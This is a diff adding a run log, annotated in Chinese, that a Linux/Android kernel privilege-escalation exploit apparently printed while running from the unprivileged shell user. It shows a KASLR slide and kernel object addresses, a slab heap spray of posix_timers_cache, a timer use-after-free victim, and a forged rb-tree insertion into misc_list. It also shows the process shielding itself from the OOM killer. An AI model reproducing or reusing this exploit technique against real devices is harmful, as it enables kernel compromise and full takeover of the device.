@@ -1,0 +1,36 @@
+[ENTER] pid=23204 argc=4
+[SAFE] 已把 pid=23204 的 oom_score_adj 降到 -1000 (防 OOM 杀掉挂起实例)
+[N] norelay=1: relay_q 全部改为直写 tracefs (uid=2000)
+[PS] PURESH: 纯 shell (no relay/no kmem); stage1 insert; slide=0x14b9880000 holes=24
+[B0c] slide=0x14b9880000 (命令行 -s) cred_cs=0xffffffd4c9a638d4 timer_cs=0xffffffd4c9b3f748 task_cs=0xffffffd4c9a130a8 self_tid=23204
+== wr1: pid=23204 ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=64 clock=THREAD(-t) spray=pipe
+[B0a] 关键参数: thread_clock=1 file_spray=0MB attempts=6 force_hit=0 selfverify=0 execpath='/proc/self/exe' kill_us=-1
+[B0] uid=2000 euid=2000 gid=2000 egid=2000
+[B0b] PURESH: filemap add/delete 已开 (纯 shell pfn 通道)
+[B1a] probe=23208 setresgid(2000)=0 errno=1
+[B1b] 本进程 kmem_cache_alloc 记录 0 条, 最后 6 条:
+[SM] B1 leak tid=23204 cred=0 recs=0 (轮 1/0 off=0x4)
+[B1] cred: records=0 va=0 | probe_task: records=0 va=0 (tid=23204)
+[B1c] cred 记录:
+[B1c] task 记录:
+[B1] -P 绝对地址写: 跳过 probe_task 依赖 (records=0)
+[B1] 目标模式=stage1 插入 misc_list (不需要 cred 地址)
+[B6] fillers ready=6 [DECFBA]
+[R0b] 轮 1/1 t=1757259ms pid=23204 pgid=23204 sid=23204 oom=-1000 cgroup=[8:groupsched:/default]
+---- attempt 1/6 ----
+[B2h] 填洞后 holes=0 (filler 进程=0)
+[PS] 空洞文件 ino=48433 wrote=512 add=512
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0x400 Pnode=0x418 Q=0x580 F=0x640 misc_list=0xffffffd4cce47860 (slide=0x14b9880000)
+[PS] 模板预置: common_pfn=3101909 node=0xffffff82f54d5f58 Pnode=0xffffff82f54d5418 wrv=0xffffff82f54d5418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 3103448 3099384 3099386 3099388 3099390 3098664 3098666 3098668 3098670 3099392 3099394 3099396 3099398 3102696 3102698 3102700 3102702 3101896 3101898 3101900 3101902 3101904 3101906 3101908
+[PS] victim=23215 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache    810    810    272   30    2 : tunables    0    0    0 : slabdata     27     27      0
+[PS] victim 自删 timer rc=0 errno=0 ai=29 ok=631 (不退出, 挂起)
+[PS] victim 自删完成 ps_deleted=1 等 500us | victim=23215 保持存活(不 kill)
+[PS] 喷涂 ino=4910e wrote=16384 add=16384
+[PS] 空洞仍空闲=17/24（已被占用=7）
+[PS] slab posix_timers_cache    809    810    272   30    2 : tunables    0    0    0 : slabdata     27     27      0
+[PS] PSPARK: 空洞空闲=17/24 | rb_erase 已触发, 不 reap, 不 kill, 永久挂起
+[SAFE] 已把 pid=23204 的 oom_score_adj 降到 -1000 (防 OOM 杀掉挂起实例)
